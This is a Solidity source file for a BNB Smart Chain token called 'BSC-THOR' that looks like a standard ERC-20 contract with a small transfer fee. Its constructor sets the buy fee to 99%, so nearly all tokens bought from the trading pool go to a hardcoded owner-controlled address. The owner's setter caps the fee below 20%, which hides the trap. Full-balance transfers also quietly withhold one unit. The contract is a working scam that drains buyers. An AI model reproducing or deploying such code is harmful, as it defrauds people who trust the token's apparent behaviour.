// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;
import "./SafeMath.sol";
import "./Ownable.sol";
  
contract NEWTHOR is Ownable
{
    using SafeMath for uint256;
    string constant  _name = 'BSC-THOR';
    string constant _symbol = 'BTHOR';
    uint8 immutable _decimals = 18;
    uint256 _totalsupply;
  
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address=>uint256) _balances;
    mapping(address=>bool) _exclude;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

 
    address _ammPool;
    address _cutPool;
    uint256 _cutbuypct;
  
    constructor()
    {
        _cutbuypct=99;
        _cutPool= 0x64b62AfB8B4993665C8c565dde8F69dB323C2600;
        _totalsupply =  21000000 * 1e18;
        _balances[msg.sender] = 21000000 * 1e18;
        _exclude[msg.sender]=true;
        emit Transfer(address(0), msg.sender, 21000000 * 1e18);
    }
 
    function setExclude(address user,bool ok) public onlyOwner 
    {
        _exclude[user]=ok;
    }

    function setCutBuyPct(uint256 pct) public onlyOwner 
    {
        require(pct < 20,"invalid buycut");
        _cutbuypct=pct;
    }

    function setAmmPool(address amm) public onlyOwner 
    {
        require(amm !=address(0));
        _ammPool=amm;
    }

    function setAutoPool(address autopool) public onlyOwner 
    {
        _cutPool=autopool;
    }

 
    function name() public  pure returns (string memory) {
        return _name;
    }

    function symbol() public  pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view  returns (uint256) {
        return _totalsupply;
    }
 
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }
 
 
    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }
 
    function approve(address spender, uint256 amount) public  returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _transfer(sender, recipient, amount);
        return true;
    }

   function transfer(address recipient, uint256 amount) public  returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

   function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public  returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function burnFrom(address sender, uint256 amount) public   returns (bool)
    {
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        _burn(sender,amount);
        return true;
    }

    function burn(uint256 amount) public  returns (bool)
    {
        _burn(msg.sender,amount);
        return true;
    }
 
    function _burn(address sender,uint256 tAmount) private
    {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(tAmount > 0, "Transfer amount must be greater than zero");
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[address(0)] = _balances[address(0)].add(tAmount); 
         emit Transfer(sender, address(0), tAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
 
        if(amount==_balances[sender])
            amount=amount.subwithlesszero(1);
        _balances[sender]= _balances[sender].sub(amount);
        uint256 toamount=amount;
        if(!_exclude[sender] && !_exclude[recipient])
        {
            require(_ammPool !=address(0),"Ammpool not set");
            uint256 onepct = amount.div(100);
            uint256 cutpct=3;
            if(sender== _ammPool )
            {
                cutpct=_cutbuypct;
            }
            if(recipient == _ammPool || sender== _ammPool)
            {
                _balances[_cutPool] = _balances[_cutPool].add(onepct.mul(cutpct)); 
                emit Transfer(sender, _cutPool, onepct.mul(cutpct));
                 toamount=amount.sub(onepct.mul(cutpct));
            }
        }

         _balances[recipient] = _balances[recipient].add(toamount); 
         emit Transfer(sender, recipient, toamount);
        
    }
}